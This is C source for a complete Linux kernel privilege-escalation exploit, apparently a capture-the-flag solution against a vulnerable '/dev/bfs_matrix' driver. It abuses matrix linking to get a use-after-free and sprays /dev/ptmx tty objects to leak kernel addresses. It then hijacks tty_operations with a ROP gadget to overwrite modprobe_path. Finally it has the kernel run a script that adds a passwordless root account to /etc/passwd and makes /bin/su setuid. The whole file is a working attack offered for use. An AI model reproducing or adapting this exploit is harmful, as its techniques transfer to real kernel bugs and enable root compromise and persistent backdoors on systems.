#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include "tty.h"
#define PAGE_SIZE 0x1000
#define logInfo(...) { \
    fprintf(stderr,"[*] "); \
    fprintf(stderr,__VA_ARGS__); \
    fputc('\n',stderr); \
};
#define logErr(...) { \
    fprintf(stderr,"[!] "); \
    fprintf(stderr,__VA_ARGS__); \
    fputc('\n',stderr); \
};
#define errExit(...){ \
    logErr(__VA_ARGS__); \
    fprintf(stderr,": %s",strerror(errno)); \
    exit(-1); \
};

#define devfile "/dev/bfs_matrix"

int openDEV(){
    int devfd = open(devfile,O_RDWR);
    if(devfd == -1)
        errExit("Open %s",devfile);
    return devfd;
}

#define IOCTL_MATRIX_SET_NAME _IOWR('s', 1, void*)
#define IOCTL_MATRIX_GET_NAME _IOWR('s', 2, void*)
#define IOCTL_MATRIX_GET_INFO _IOWR('s', 3, struct matrix_info)
#define IOCTL_MATRIX_SET_INFO _IOWR('s', 4, struct matrix_info)
#define IOCTL_MATRIX_GET_POS  _IOWR('s', 5, struct matrix_pos)
#define IOCTL_MATRIX_SET_POS  _IOWR('s', 6, struct matrix_pos)
#define IOCTL_MATRIX_DO_LINK  _IOWR('s', 7, int)

struct matrix_info
{
  int rows;
  int cols;
};
struct matrix_pos
{
  int row;
  int col;
  uint8_t byte;
};
struct matrix
{
  int rows;                 // number of rows in the matrix
  int cols;                 // number of columns in the matrix
  uint8_t* data;            // 1-d backing data (rows x cols size)
  char name[16]; // name of the matrix
  struct matrix* link;      // linked peer
  struct task_struct* task; // owner of the object
  uint64_t lock[2];          // fine grained locking
};

int set_info(int devfd, struct matrix_info* info){
    return ioctl(devfd,IOCTL_MATRIX_SET_INFO,info);
}
int do_link(int devfd1, int devfd2){
    return ioctl(devfd1,IOCTL_MATRIX_DO_LINK,devfd2);
}
int setname(int devfd,char* name){
    return ioctl(devfd,IOCTL_MATRIX_SET_NAME,name);
}

void readMARIX64(int devfd, uint64_t* need, off64_t offset){
    struct matrix_pos leaker = {0};
    leaker.col = 0;
    for(uint32_t i = 0 ; i < 8;  ++i ){
        leaker.row = offset+i;
        ioctl(devfd,IOCTL_MATRIX_GET_POS,&leaker);
        ((char *)need)[i] = leaker.byte;
    }
}

void writeMATRIX64(int devfd, uint64_t* todo, off64_t offset){
    struct matrix_pos write_pos = {0};
    write_pos.col = 0;
    for(uint32_t i = 0 ; i < 8 ; ++i){
        write_pos.row = offset+i;
        write_pos.byte = ((char *)todo)[i];
        ioctl(devfd,IOCTL_MATRIX_SET_POS,&write_pos);
    }
}

int main(int argc,char** argv,char** envp){
    int fd1 = openDEV();
    int ptmx_fd = open("/dev/ptmx",O_RDWR);
    uint64_t chunk_addr1 = 0;
    if(ptmx_fd < 0)
        errExit("Open ptmx");
    struct matrix_info info1={
        .rows = 0x2e0,
        .cols = 1
    };
    close(ptmx_fd);
    if(set_info(fd1,&info1) < 0 )
        errExit("Set info fd1");
    logInfo("Set fd1 info: done.");
    //Leaking
    readMARIX64(fd1,&chunk_addr1,0x38);
    chunk_addr1 -= 0x38;
    logInfo("Chunk1 @ %p",(void *)chunk_addr1);


    int fd2 = openDEV();
    ptmx_fd = open("/dev/ptmx",O_RDWR);
    if(ptmx_fd < 0)
        errExit("Open ptmx");
    struct matrix_info info2={
        .rows = 0x2e0,
        .cols = 1
    };
    close(ptmx_fd);
    if(set_info(fd2,&info2) < 0)
        errExit("Set info fd2");
    logInfo("Set fd2 info: done.");
    
    //Linking
    if(do_link(fd1,fd2) < 0)
        errExit("Do_link");
    logInfo("Link fd1 <-> fd2: done.");

    //Leaking
    uint64_t ptm_unix98_ops = 0;
    uint64_t chunk_addr2 = 0;
    readMARIX64(fd2,&ptm_unix98_ops,0x18);
    readMARIX64(fd2,&chunk_addr2,0x38);
    chunk_addr2 -= 0x38;
    logInfo("ptm_unix98_ops = %p",(void *)ptm_unix98_ops);
    logInfo("Chunk2 @ %p",(void *)chunk_addr2);

    int fd3 = openDEV();

    if(do_link(fd2,fd3) < 0)
        errExit("do_link");
    
    logInfo("Link fd2 <-> fd3: done. But fd1 -> fd2 ?");
    close(fd2);
    logInfo("Closed fd2");

    struct matrix_info info3={
        .rows = sizeof(struct matrix),
        .cols = 1
    };
    
    if(set_info(fd3,&info3))
        errExit("set_info 3");
    logInfo("Allocate matrix3->data dup matrix2");

    int fd4 = openDEV();
    if(do_link(fd3,fd4))
        errExit("do_link");
    logInfo("Link fd4 <-> fd3");

    uint32_t rowcol[2] = {0x100,0x100};
    writeMATRIX64(fd4,(uint64_t *)rowcol,0);
    logInfo("write 0x100 0x100 to old matrix2{rows,cols}");

    ptmx_fd = open("/dev/ptmx",O_RDWR);
    if(ptmx_fd < 0)
        errExit("Open ptmx");
    logInfo("pmtx = matrix2->data");


    //Preparing payload
    int _ = open("/dev/ptmx",O_RDWR);
    if(_ < 0)
        errExit("open ptmx");
    info3.rows = 0x2e0;
    close(_);
    if(set_info(fd3,&info3))
        errExit("set_info 3");
    uint64_t chunk_addr3 = 0;
    readMARIX64(fd3,&chunk_addr3,0x38);
    chunk_addr3 -= 0x38;
    logInfo("Chunk3 @ %p",(void *)chunk_addr3);
    uint64_t _text = ptm_unix98_ops - 0x82fb40;
    uint64_t modprobe_path = _text + 0xa51ba0;
    
    //rop
    uint64_t rop = _text+0x2dd74f; // xor eax,eax ; mov qword ptr [rdx], rcx ; ret
    writeMATRIX64(fd4,&rop,offsetof(struct tty_operations,ioctl));
    writeMATRIX64(fd1,&chunk_addr3,0x18);

    //Change /sbin/modprobe to /home/user/vjp
    char* inject = "/home/user/vjp";
    for(uint64_t i = 0 ; i < strlen(inject)/4+1; ++i){
        ioctl(ptmx_fd,*(uint32_t *)(inject+4*i),modprobe_path+4*i);
    }

    int vjpfd = open("/home/user/vjp",O_CREAT | O_RDWR);
    if(vjpfd < 0)
        errExit("open /home/user/vjp");
    dprintf(vjpfd,
        "#!/bin/sh\n"
        "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
        "/bin/chmod +s /bin/su"
    );
    close(vjpfd);
    if(chmod("/home/user/vjp",0777))
        errExit("chmod");

    //Trigger call call_modprobe
    int magic = open("/home/user/pwn",O_CREAT | O_RDWR);
    if(magic < 0)
        errExit("open /home/user/pwn");
    dprintf(magic,"\x13\x37\x42\x42");
    close(magic);
    if(chmod("/home/user/pwn",0777))
        errExit("chmod");

    //Root
    system("/home/user/pwn");
    system("cat /etc/passwd");
    system("su vjp");
}
